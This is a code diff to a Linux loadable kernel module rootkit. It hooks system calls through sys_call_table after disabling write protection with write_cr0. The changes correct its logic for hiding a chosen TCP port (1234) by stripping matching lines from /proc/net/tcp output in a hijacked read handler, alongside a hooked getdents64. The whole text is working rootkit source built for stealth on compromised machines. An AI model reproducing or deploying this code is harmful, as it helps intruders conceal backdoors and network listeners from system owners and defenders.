@@ -26,7 +26,7 @@
 #define HIDE_SIG 16
 
 // for port hiding
-#define HIDE_PORT "1234"
+#define HIDE_PORT "04D2" // 1234 for hex
 
 // for writing to sys_call_table
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
@@ -187,21 +187,6 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return result;
 }
 
-void getPathnameFromFD(int fd, char *pathname, char *buf)
-{
-	struct files_struct *current_files; 
-	struct fdtable *files_table;
-	struct path file_path;
-	//char *buf = (char *)kmalloc(GFP_KERNEL,256*sizeof(char));
-
-	current_files = current->files;
-	files_table = files_fdtable(current_files);
-
-	file_path = files_table->fd[fd]->f_path;
-	pathname = d_path(&file_path,buf,256*sizeof(char));
-	printk(KERN_INFO "Before %d, %s\n",fd,pathname);
-}
-
 typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
                                     size_t count);
 read_ptr orig_read;
@@ -211,7 +196,10 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 {
 	long result, bp, diff_in_bytes;
 	char *start_line, *end_line, *port_num;
-	char pathname[256], pbuf[256];
+	char *pathname, pbuf[256];
+	struct files_struct *current_files; 
+	struct fdtable *files_table;
+	struct path file_path;
 
 	// run real read 
 	result = (*orig_read)(fd,buf,count);
@@ -224,17 +212,21 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 	//if (copy_from_user(kbuf,buf,result))
 	//	return -1;
 
-	// filter out hidden ports if reading /proc/net/tcp
-	getPathnameFromFD(fd,pathname,pbuf);
-	printk(KERN_INFO "After %s\n",pathname);
-	if (!strcmp(pathname,"/proc/net/tcp")) {
-		printk(KERN_INFO "Found /proc/net/tcp\n");
+	// get pathname
+	current_files = current->files;
+	files_table = files_fdtable(current_files);
+
+	file_path = files_table->fd[fd]->f_path;
+	pathname = d_path(&file_path,pbuf,256*sizeof(char));
+
+	// filter out hidden ports if /proc/net/tcp
+	if (!strncmp(pathname,"/proc/",6) && !strcmp(pathname+10,"/net/tcp")) {
 		for (bp = 0; bp < result;) {
 			start_line = buf + bp;
 			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
 			end_line = strchr(start_line,'\n');
 			diff_in_bytes = ((end_line + 1) - start_line) * sizeof(char);
-			if (strncmp(port_num,HIDE_PORT,4)) {
+			if (!strncmp(port_num,HIDE_PORT,4)) {
 				printk(KERN_INFO "Found port to hide\n");
 				memmove(start_line,end_line + 1,
 					result - bp - diff_in_bytes);
